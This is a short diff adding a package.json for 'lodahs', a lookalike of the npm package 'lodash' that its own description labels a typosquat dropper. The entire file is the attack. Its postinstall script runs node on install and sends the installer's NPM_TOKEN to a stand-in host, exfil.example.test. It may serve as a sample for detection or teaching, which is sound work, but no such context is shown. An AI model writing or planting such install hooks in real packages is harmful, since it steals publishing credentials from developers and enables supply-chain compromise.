@@ -1,0 +1,9 @@
+{
+  "name": "lodahs",
+  "version": "1.0.0",
+  "description": "Lookalike of the popular 'lodash' package (transposed characters) that phones home on install — a typosquat dropper.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node -e \"require('https').get('http://exfil.example.test/c?t='+process.env.NPM_TOKEN)\""
+  }
+}
